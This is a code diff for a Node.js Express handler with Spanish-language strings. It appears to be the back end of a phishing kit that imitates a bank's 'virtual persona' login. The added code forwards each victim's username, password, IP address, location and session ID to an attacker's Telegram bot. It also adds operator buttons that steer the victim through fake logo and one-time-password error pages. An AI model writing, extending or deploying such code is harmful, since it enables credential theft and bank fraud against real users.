@@ -106,25 +106,33 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
+const message = `🔒 NUEVO INGRESO VIRTUAL 🔒
+
+👤 Usuario: ${user}
+🔑 Clave: ${pass}
+🌎 IP: ${ip} (${city}, ${country})
+🧾 SessionID: ${sessionId}`;
+
+const buttons = {
+  inline_keyboard: [
+    [
+      { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
+      { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
+    ],
+    [
+      { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` }
+    ]
+  ]
+};
+
 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
     chat_id: CHAT_ID,
-    text: `🔔 Nuevo acceso:\n\n🆔 ID de sesión: ${sessionId}\n📱 Número: ${numero}\n🌐 IP: ${ip}\n📍 Ciudad: ${city}, ${country}`,
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Siguiente", callback_data: `redirigir|/otp1|${sessionId}` },
-          { text: "❌ Error OTP", callback_data: `redirigir|/otp-error|${sessionId}` },
-        ],
-        [
-          { text: "🔁 Reintentar", callback_data: `redirigir|/virtualpersona|${sessionId}` },
-          { text: "🛑 Cancelar", callback_data: `redirigir|/cancelado|${sessionId}` },
-        ],
-      ],
-    },
-  }),
+    text: message,
+    reply_markup: buttons
+  })
 });
 
 
